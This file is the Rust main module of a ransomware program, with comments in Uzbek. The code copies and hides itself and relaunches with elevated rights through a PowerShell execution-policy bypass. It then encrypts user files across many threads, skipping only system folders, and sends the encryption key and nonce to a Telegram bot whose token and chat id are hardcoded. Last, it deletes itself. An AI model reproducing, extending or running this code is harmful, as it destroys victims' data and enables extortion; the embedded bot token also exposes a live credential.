use std::env;
use std::sync::{Arc, Mutex, mpsc};
use std::thread;
use std::process::Command;
use std::net::{TcpStream, Shutdown};
use std::io::{Write, Read};

mod encryption;
mod file_utils;
mod process;
mod telegram;

use encryption::{create_key_nonce, encrypt_file};
use file_utils::{collect_paths, copy_and_hide_exe, delete_self};
use process::manage_clones;
use telegram::send_to_telegram;

const EXCLUDED_PATHS: [&str; 5] = [
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "\\.git\\",
    "$RECYCLE.BIN",
];

const BASE_PORT: u16 = 12345; // Boshlang'ich port, har bir instance uchun +i

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let current_exe = env::current_exe()?;

    if args.len() > 1 {
        if args[1] == "-first" {
            println!("[*] -first rejimi: 3 ta -clone klonni ishga tushirish va socket kuzatish...");
            manage_clones(&current_exe.to_string_lossy().to_string(), BASE_PORT)?;
            return Ok(());
        } else if args[1] == "-clone" {
            println!("[*] -clone rejimi: Shifrlash va kalit jonatish...");
            // .env yuklash
            dotenv::dotenv().ok();
            let telegram_token = "7628596830:AAE7VdOVCQ-87PTbtGdNd7ntW3bqULahQ6o";
            let chat_id = "1179267491";

            // Socket client ochish va heartbeat thread boshlash
            let stream = TcpStream::connect(format!("127.0.0.1:{}", BASE_PORT + args.get(2).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0)))?;
            let mut stream_clone = stream.try_clone()?;
            let heartbeat_handle = thread::spawn(move || {
                loop {
                    if stream_clone.write_all(b"alive\n").is_err() {
                        break;
                    }
                    stream_clone.flush().ok();
                    thread::sleep(std::time::Duration::from_secs(5));
                }
                println!("[*] Heartbeat thread stopped.");
            });

            // Kalit va nonce hosil qilish va saqlash
            let (key, nonce, key_b64, nonce_b64) = create_key_nonce()?;
            encryption::save_key_nonce(&key_b64, &nonce_b64)?;

            // Fayl yo‘llarini yig‘ish
            let paths = collect_paths(&EXCLUDED_PATHS)?;

            // Maksimal thread soni
            let max_threads = thread::available_parallelism()?.get();
            println!("[*] Ishlaydigan thread soni: {}", max_threads);

            // Kanal va thread-pool
            let (tx, rx) = mpsc::channel::<std::path::PathBuf>();
            let rx = Arc::new(Mutex::new(rx));
            let mut handles = Vec::with_capacity(max_threads as usize);

            for _ in 0..max_threads {
                let rx = Arc::clone(&rx);
                let key = Arc::clone(&key);
                let nonce = Arc::clone(&nonce);

                let handle = thread::spawn(move || {
                    while let Ok(path) = rx.lock().unwrap().recv() {
                        if let Err(e) = encrypt_file(&path, &key, &nonce) {
                            eprintln!("[-] Xato {}: {}", path.display(), e);
                        }
                    }
                });
                handles.push(handle);
            }

            // Fayl yo‘llarini kanalga yuborish
            for p in paths {
                tx.send(p)?;
            }
            drop(tx);

            // Thread’lar tugashini kutish
            for h in handles {
                h.join().unwrap();
            }

            // Kalit va nonce Telegramga yuborish
            if let Err(e) = send_to_telegram(telegram_token, chat_id, &key_b64, &nonce_b64) {
                eprintln!("[-] Telegramga yuborishda xato: {}. Kalit key.txt fayliga saqlandi.", e);
            } else {
                println!("[+] Kalit va nonce Telegramga yuborildi");
            }

            println!("[+] Barcha fayllar shifrlab bo‘lingach, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!");

            // Shifrlash tugagach, socket ni yopish va heartbeat ni to'xtatish
            stream.shutdown(Shutdown::Both).ok();
            heartbeat_handle.join().ok();
            return Ok(());
        }
    }

    // Hech qanday flag siz: O'zini klonlash va -first bilan ishga tushirish
    println!("[*] Oddiy rejim: O'zini klonlash va -first bilan ishga tushirish...");
    let dest_exe = copy_and_hide_exe(&current_exe)?;

    // Klonni -first bilan elevated ishga tushirish
    let status = Command::new("powershell")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(format!(
            "Start-Process -FilePath '{}' -Verb RunAs -ArgumentList '-first'",
            dest_exe.display()
        ))
        .status()
        .map_err(|e| format!("Spawn error: {}", e))?;
    if status.success() {
        println!("[*] Klon -first bilan ishga tushirildi: {:?}", dest_exe);
    } else {
        eprintln!("[-] Klon ishga tushirishda xato: status={}", status);
        return Err(format!("Failed to start clone with -first: status={}", status).into());
    }

    // O'zini o'chirish
    delete_self(&current_exe)?;
    Ok(())
}